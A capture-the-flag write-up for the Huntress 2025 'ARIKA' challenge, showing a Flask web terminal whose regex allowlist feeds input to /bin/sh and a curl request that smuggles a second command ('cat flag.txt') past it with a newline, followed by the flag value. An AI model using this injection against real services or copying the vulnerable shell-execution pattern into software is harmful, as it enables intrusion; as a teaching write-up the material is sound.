# Prompt

![](/huntress_2025/Day_04/ARIKA/Challenge_ARIKA.png "Challenge Prompt")

# Solution

- If you start by looking at the zip file, you will see the Flask app app.py file:

```python
import os, re
import subprocess
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

ALLOWLIST = ["leaks", "news", "contact", "help",
             "whoami", "date", "hostname", "clear"]

def run(cmd):
    try:
        proc = subprocess.run(["/bin/sh", "-c", cmd],capture_output=True,text=True,check=False)
        return proc.stdout, proc.stderr, proc.returncode
    except Exception as e:
        return "", f"error: {e}\n", 1

@app.get("/")
def index():
    return render_template("index.html")

@app.post("/")
def exec_command():
    data = request.get_json(silent=True) or {}
    command = data.get("command") or ""
    command = command.strip()
    if not command:
        return jsonify(ok=True, stdout="", stderr="", code=0)
    if command == "clear":
        return jsonify(ok=True, stdout="", stderr="", code=0, clear=True)
    if not any([ re.match(r"^%s$" % allowed, command, len(ALLOWLIST)) for allowed in ALLOWLIST]):
        return jsonify(ok=False, stdout="", stderr="error: Run 'help' to see valid commands.\n", code=2)
    
    stdout, stderr, code = run(command)
    return jsonify(ok=(code == 0), stdout=stdout, stderr=stderr, code=code)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 5000)), debug=False)
```

- If you look at the source code, you can see that there are more commands than are listed on the website itself. 

![Step 1](/huntress_2025/Day_04/ARIKA/Step_1_ARIKA_Shell.png "Step 1")

- My first thought was maybe being able to get it by using GTFObins, but that didn’t work. So I started just looking at how the terminal responds:

![Step 2](/huntress_2025/Day_04/ARIKA/Step_2_ARIKA_Response.png "Step 2")

- Let’s try some curl since our commands through the web terminal aren’t working. 

```bash
curl -X POST -H "Content-Type: application/json" -d '{"command": "date\ncat flag.txt"}' http://10.1.113.42/ | jq
```

![Step 3](/huntress_2025/Day_04/ARIKA/Step_3_Command_Injection.png "Step 3")

- Looking at the code, the regex is successful at preventing characters like &, ;, or |. So if we try ‘\n’, we can actually get a response.

![Step 4](/huntress_2025/Day_04/ARIKA/Step_4_Flag.png "Step 4")

# Flag

- flag{eaec346846596f7976da7e1adb1f326d}